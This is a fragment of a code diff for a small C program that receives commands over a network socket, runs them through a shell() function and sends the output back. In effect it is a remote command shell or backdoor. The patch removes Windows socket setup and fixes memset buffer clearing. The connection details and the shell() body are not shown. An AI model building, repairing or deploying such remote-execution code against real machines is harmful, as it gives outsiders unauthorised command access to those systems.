@@ -1,7 +1,3 @@
-#if defined (_WIN32) || defined (WIN32)
-#include <io.h>
-#include <winsock32.h>
-#endif
 #include "header.h"
 int shell(char *cmd)
 {
@@ -26,10 +22,6 @@ int shell(char *cmd)
 }
 int main(int argc,char *argv[])
 {
-	#if defined (_WIN32) || defined (WIN32)
-	WSADATA wsa;
-	WSAStartup(MAKEWORD(2,2),wsa);
-	#endif
 	setlocale(LC_ALL,"");
 	char buffer[300];
 	struct sockaddr_in extern_struct;
@@ -56,13 +48,10 @@ int main(int argc,char *argv[])
 	while(1)
 	{
 		recv(externfd,buffer,sizeof(buffer),0);
-		memset(output,0,strlen(output));
+		memset(output,0,sizeof(output));
 		shell(buffer);
 		send(externfd,output,sizeof(output),0);
-		memset(output,0,strlen(output));
+		memset(output,0,sizeof(output));
 	}
-	#if defined (WIN32)|| defined(_WIN32)
-	WSACleanup();
-	#endif
 	close(externfd);
 }
